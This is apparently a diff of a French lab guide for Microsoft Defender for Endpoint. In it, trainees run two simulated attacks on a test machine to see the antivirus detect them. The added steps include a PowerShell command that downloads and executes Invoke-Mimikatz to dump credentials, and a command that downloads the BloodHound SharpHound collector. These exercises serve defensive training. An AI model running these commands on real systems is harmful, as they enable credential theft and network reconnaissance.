@@ -4,20 +4,47 @@
 
 ## Attaques simulées
 
-Dans cette tâche, vous allez simuler une attaque afin d’explorer les fonctionnalités de Microsoft Defender pour point de terminaison.
+Dans cette tâche, vous allez exécuter deux attaques simulées pour explorer les fonctionnalités de Microsoft Defender for Endpoint.
 
-1. Si vous n’êtes pas déjà au Microsoft Defender Security Center, accédez-y à l’adresse (https://security.microsoft.com) connecté en tant qu’Administrateur pour votre locataire.
+1. Si vous n’êtes pas déjà sur le portail Microsoft Defender XDR dans votre navigateur, accédez à Microsoft Defender XDR à l’adresse (https://security.microsoft.com) connecté en tant qu’administrateur pour votre locataire.
 
-1. Dans le menu, sous **Points de terminaison**, sélectionnez **Évaluation et tutoriels**, puis **Tutoriels et simulations** à gauche.
+Vous exécuterez les attaques *simulées* à l’aide de *PowerShell* sur *WIN1* pour explorer les fonctionnalités de Microsoft Defender pour point de terminaison.
 
-1. Sélectionnez l’onglet **Tutoriels**.
+`Attack 1: Mimikatz - Credential Dumping`
 
-1. Sous *Investigation automatisée (porte dérobée)* ,un message décrivant le scénario s‘affiche. Sous ce paragraphe, cliquez sur **Lire la procédure pas à pas**. Un nouvel onglet de navigateur apparaît. Il content des instructions pour effectuer la simulation.
+1. Sur l’ordinateur *WIN1*, tapez **Commande** dans la barre de recherche, puis sélectionnez **Exécuter en tant qu’administrateur**.
 
-1. Dans le nouvel onglet du navigateur, recherchez la section intitulée **Exécuter la simulation** (page 5, à partir de l’étape 2) et suivez les étapes pour mener l’attaque. **Conseil :** le fichier de simulation *RS4_WinATP-Intro-Invoice.docm* figure sur le portail, juste sous la **procédure pas à pas** que vous avez sélectionnée à l’étape précédente en choisissant le bouton **Obtenir le fichier de simulation**.
+1. Copiez et collez la commande suivante dans l’**administrateur : Fenêtre d’invite de commandes**, puis appuyez sur **Entrée** pour l’exécuter.
 
-    1. **Remarque :** une fois que vous avez exécuté le fichier contenant le cheval de Troie, vous pouvez revenir au [Centre de sécurité Microsoft 365 Defender](https://security.microsoft.com), puis cliquer sur l’onglet **Incidents** pour afficher les alertes. Le guide fait référence de manière incorrecte au *portail Microsoft Defender ATP*, qui a été migré et renommé.
-    1. Ouvrez la page de l’incident, puis cliquez sur **Gérer l’incident**. Cliquez sur **Résoudre l’incident** pour supprimer toutes les alertes actives.
+    ```CommandPrompt
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+    ```
 
+1. Vous devez voir un message indiquant que l’*accès est refusé* ainsi qu’un message contextuel de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` affichant les *menaces trouvées*.
 
-## Vous avez terminé la démonstration
+1. Quittez l’**administrateur : Fenêtre d’invite de commandes** en tapant **quitter** et en appuyant sur **Entrée**.
+
+`Attack 2: Bloodhound - Collection`
+
+1. Sur l’ordinateur *WIN1*, entrez **PowerShell** dans la barre de recherche, sélectionnez **Windows PowerShell**, puis **Exécuter en tant qu’administrateur**.
+
+1. Copiez et collez les commandes suivantes dans l’**administrateur : Fenêtre Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.
+
+    ```PowerShell
+    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+    >**Remarque :** Il est recommandé de copier, coller et exécuter les commandes une par une. Vous pouvez ouvrir *Bloc-notes* et copier les commandes dans un fichier temporaire pour y parvenir. La première commande crée un dossier nommé *ExternalPayloads* dans le même dossier que le dossier *Atomic Red Team*. La deuxième commande télécharge le fichier *SharpHound.ps1* à partir du référentiel GitHub *BloodHound* et l’enregistre dans le dossier *ExternalPayloads*.
+
+1. Un message contextuel s’affiche à partir de `Windows Security Virus and threats protection` affichant les *menaces trouvées*.
+
+1. Copiez et collez la commande suivante dans l’**administrateur : Fenêtre Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.
+
+    ```PowerShell
+    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+1. Si la sortie a la valeur *True*, le fichier de charge utile du programme malveillant n’a pas été supprimé par Microsoft Defender Antivirus. Si la sortie a la valeur *False*, le fichier de charge utile du programme malveillant a été supprimé par Microsoft Defender Antivirus. Utilisez la touche de direction vers le haut pour répéter la commande jusqu’à ce que la sortie soit *False*.
+
+## Vous avez terminé la démonstration.
